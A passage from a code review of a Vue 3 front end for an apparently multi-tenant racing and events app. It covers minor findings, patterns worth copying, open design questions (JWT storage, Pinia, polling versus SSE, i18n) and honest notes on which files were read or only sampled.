| **Low** | `vueapp/src/components/ExtrasPicker.vue:147-155` — **inline `apiOrigin()` duplicated from `stores/branding.ts:136-142`** | The same URL-origin computation appears in branding.ts, ExtrasPicker.vue, and probably elsewhere. Worth extracting to `helpers/ApiUrl.ts`. | Extract `apiOrigin()` + `toAbsoluteUrl(url)` into a tiny helper and import from both call sites. ~20 lines saved. |
| **Low** | `vueapp/src/composables/useDragReorder.ts:51` (`r.sortOrder = (i + 1) * 10`) — **mutates the consumer's row objects in place** | The renumber assigns to `r.sortOrder` on each row, mutating the same objects the consumer's `rows.value` holds. Vue's reactivity tolerates this (the row objects are deep-reactive) but a future consumer who's holding the same object reference elsewhere (e.g., for a "before edit" snapshot) would see their snapshot mutated too. The composable should return a new array of new objects rather than mutate. | Spread each row inside the `rebuilt.map`: `rebuilt.forEach((r, i) => { r.sortOrder = (i+1)*10 })` becomes `const renumbered = rebuilt.map((r, i) => ({ ...r, sortOrder: (i+1)*10 }))`. Then `opts.rows.value = renumbered`. Slightly more allocation but eliminates the in-place mutation surprise. |

## Patterns worth replicating

- **`useDragReorder` composable.** Single source of truth for drag-drop
  reorder, with a filter for kind-scoped subsets (used by `TicketTiersList`
  for spectator vs race-entry tiers). Pattern is correct: visible-subset
  drag, interleave back into canonical list, renumber `i * 10` for sparse
  insertion room, save bulk endpoint. The two findings above (no rollback,
  in-place mutation) are polish, not concept.
- **`branding` store as a module-scoped `reactive()` singleton.** Plain Vue 3
  reactivity, no Pinia overhead, imports cleanly from anywhere. For an app
  this size it's the right call; the missing piece is the `refreshBranding()`
  exit (Medium above).
- **`StripeHelper.getStripe(key)` memoization.** Caches the `loadStripe`
  promise per key so multiple components mounting the Payment Element on the
  same page don't re-load Stripe.js. Correct shape.
- **`RichTextView` as the canonical render component.** Tight DOMPurify
  allowlist, no event handlers, conservative ALLOWED_ATTR. Section 10's
  finding is that not every render path uses it — the component itself is
  good.
- **`NavBar.computeInitialOpen()` + watch on `route.path`.** The
  current-group auto-expand on the admin drawer is good UX. Worth lifting
  to a `useExpandedGroup(currentPath, groups)` composable if more nav UIs
  appear.
- **Lazy-loaded routes everywhere.** Every route uses `() => import('...')`
  so the rider initial bundle stays small. Admin routes don't ship to riders
  until they navigate.
- **`useDisplay().mobile` in NavBar.** Vuetify's responsive util used for a
  single component-level branch rather than CSS media queries. Right tool
  for "show/hide a different DOM tree at breakpoint" — wrong tool for "make
  a column narrower" (Vuetify CSS classes win there).
- **`reorderProducts({ items })` endpoint shape.** Consistent across
  PassService, SeasonPassService, TicketService, TenantService (gallery,
  track graphics). The composable can rely on this contract.
- **`Filters.dateTime` / `dateTime` declared per-file** is the right call
  given the tenant-timezone requirement — flagging only that `Filters.date`
  is wrong (browser tz) and should either be removed or fixed.

## Open questions

1. **Move the JWT to httponly cookies?** Critical finding above. Requires
   server-side `Set-Cookie` on login + a CORS / SameSite story + CSRF
   tokens for writes. Big surface but cuts a class of XSS-driven token
   exfiltration. Worth scoping; the current Section 10 `v-html` XSS
   findings are the catalyst.
2. **Adopt Pinia?** Two singletons (`branding`, `authHelper`) is enough
   that the current "module-scoped reactive" pattern works, but cross-cuts
   like impersonation state, notification cache, and cart state will grow.
   Pinia gives devtools, plugins (persistence, hydration), and clearer
   testability. If the answer is yes, do it before adding a third or
   fourth singleton.
3. **Where does the typed-wrapper refactor live?** Suggested fixes above
   sketch a `unwrap<T>(promise)` or a typed `apiClient.get<T>` wrapper
   that auto-unpacks `{ data: T }`. Decision needed: helper at every call
   site (smaller blast radius) or a custom axios instance with a response
   interceptor (drops the wrapper across the entire app at once). The
   instance approach is cleaner long-term but a riskier one-shot change.
4. **Pinia or composable for the `branding` refresh pattern?** Adding
   `refreshBranding()` is straightforward; the harder design question is
   "should every Admin/Settings save handler call it?" One pattern: have
   the API return the new branding row on every settings PUT, and have the
   service code merge that into the `branding` reactive — no extra GET.
5. **Should the JWT-from-claims path die?** The `decodeJwt` bootstrap is
   convenient (no /Me round-trip on app boot) but introduces the stale-role
   problem documented in the High above. Calling `/Me` on every boot adds
   one round-trip; the data shape (current role + permissions + impersonating
   flag) is small. Most apps just do the round-trip. The argument for not
   doing it is splash-time — but the splash is already wired (App.vue) and
   `/Me` could land while branding is still loading.
6. **Polling vs SSE for notifications.** NotificationBell polls every 60s
   forever. A small SSE endpoint (`GET /Notification/Stream` that yields
   `unread_changed` events) would let us drop polling. The plumbing isn't
   trivial (server-side `IAsyncEnumerable` + Kestrel keepalive + a per-user
   subscription bus), but it solves the "20-tab cost" problem and gives
   real-time inbox updates.
7. **Internationalization story.** Today every label is hardcoded English.
   `vue-i18n` is the standard answer; the components are not structured
   to support it (no `t('...')` calls anywhere). If a tenant ever asks for
   Spanish-language UI on their subdomain, this is a significant refactor.
   Worth deciding now whether to defer i18n indefinitely or wire the
   plumbing.
8. **TypeScript 5.x upgrade timing.** Bumping ts/vue-tsc/vite (Medium
   above) is a half-day of fixing diagnostics. Some are listed as
   pre-existing in earlier sections (`import.meta.env`, etc.) — bumping
   to TS 5.x with `"verbatimModuleSyntax": true` and proper
   `vite-env.d.ts` will tighten those. Recommended before any large
   refactor of the service layer.

## Coverage notes

- I read every file under `src/composables/`, `src/stores/`, `src/helpers/`,
  `src/router/`, `src/main.ts`, `src/App.vue`. For `src/components/` I read
  every component listed in scope plus `EventDialog.vue`, `SocialShare.vue`,
  `Spinner.vue`, `QrCode.vue`, `PhotoCapture.vue`, `NewsletterSignup.vue`,
  `NotificationBell.vue` end-to-end and confirmed the others (`Footer.vue`,
  `ImpersonationBanner.vue`) were small enough to read in full.
- For `src/services/` I spot-checked ~13 of the 30 files. The remaining
  services follow the identical shape: class with `apiUrl` constructor,
  methods that return `axios.get/post/put/delete<{ data: T }>(...)`. The
  Medium-severity findings about the duplicated scaffolding and `(r.data
  as any).data` cast apply across all 30.
- `src/views/` was out of scope for this section but I sampled `Login.vue`,
  `Waiver.vue`, `BuySpectator.vue` for the auth-redirect and
  signature-handling cross-cuts.
- I did not run `vue-tsc --noEmit` because no code changes were applied and
  the user's notes say pre-existing typing gaps are documented elsewhere.
- I did not bench the bundle size; the `package.json` Medium finding about
  unused `vue-meta` / `vue-gtag` and the stale toolchain is the right
  starting point.
- The Critical above (JWT in localStorage × stored XSS) is materially the
  combination of the Section 10 findings and the storage choice flagged
  here. Neither alone is necessarily a Critical; the combination is.
